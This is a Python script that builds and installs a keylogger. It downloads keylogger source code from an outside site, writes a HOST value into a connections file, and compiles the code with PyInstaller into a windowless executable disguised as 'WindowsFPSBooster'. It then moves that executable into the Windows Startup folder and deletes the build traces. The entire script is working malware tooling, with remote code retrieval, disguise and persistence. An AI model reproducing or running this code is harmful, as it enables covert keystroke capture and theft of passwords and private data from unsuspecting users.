import os
import requests
import socket
import shutil

ip = socket.gethostbyname(socket.gethostname())

user = os.getlogin()
startup_path = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

CF = open("./CLIENT_RAW.py", "wb")
CF.write(requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/keylogger.py", allow_redirects=True).content)
CF.close()

CCN = open("./connections.py", "x")
CCN.write(f"HOST = '{ip}'")
CCN.close()

CI = open("CLIENT_ICON.ico", "wb")
CI.write(requests.get("https://anonymouskeylogger.netlify.app/assets/icons/warning.ico", allow_redirects=True).content)
CI.close()

os.system("pyinstaller --onefile -w --icon ./CLIENT_ICON.ico --name WindowsFPSBooster ./CLIENT_RAW.py")
os.remove("./CLIENT_RAW.py")
os.remove("CLIENT_ICON.ico")
os.remove("./connections.py")
shutil.rmtree("./build")
shutil.move("./dist/WindowsFPSBooster.exe", f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsFPSBooster.exe")
os.rmdir("./dist")
os.remove("./WindowsFPSBooster.spec")
